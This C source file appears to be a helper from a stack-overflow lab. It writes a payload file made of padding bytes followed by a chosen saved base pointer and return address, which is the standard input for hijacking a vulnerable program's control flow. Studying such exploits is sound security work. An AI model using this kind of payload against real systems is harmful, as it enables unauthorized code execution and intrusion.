#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint64_t pointer_value = 0, stack_base_pointer_value = 0;
    printf("enter desired return pointer value\n");
    scanf("%lx", &pointer_value);
    
    printf("enter correct stack base pointer value\n");
    scanf("%lx", &stack_base_pointer_value);

    printf("enter amount of padding before pointer in bytes\n");

    unsigned int padding_amount = 0;
    scanf("%ud", &padding_amount);
    
    char* hacking_string = (char*)malloc(sizeof(char) * (padding_amount) +
                            2 * sizeof(pointer_value) + 1);
    size_t i = 0;
    for (; i < padding_amount; ++i) {
        hacking_string[i] = 'a';
    }
    *(uint64_t*)(hacking_string + i) = stack_base_pointer_value;
    *(uint64_t*)(hacking_string + i + sizeof(uint64_t)) = pointer_value;
    hacking_string[i + 2 * sizeof(uint64_t)] = '\0';

    FILE* file = fopen("hacking_text_string", "w");
    //fprintf(file, "%s", hacking_string);
    for (size_t j = 0; j < sizeof(char) * (padding_amount) + 2 * sizeof(pointer_value); ++j) {
        fprintf(file, "%c", hacking_string[j]);
    }
    fclose(file);
    
}
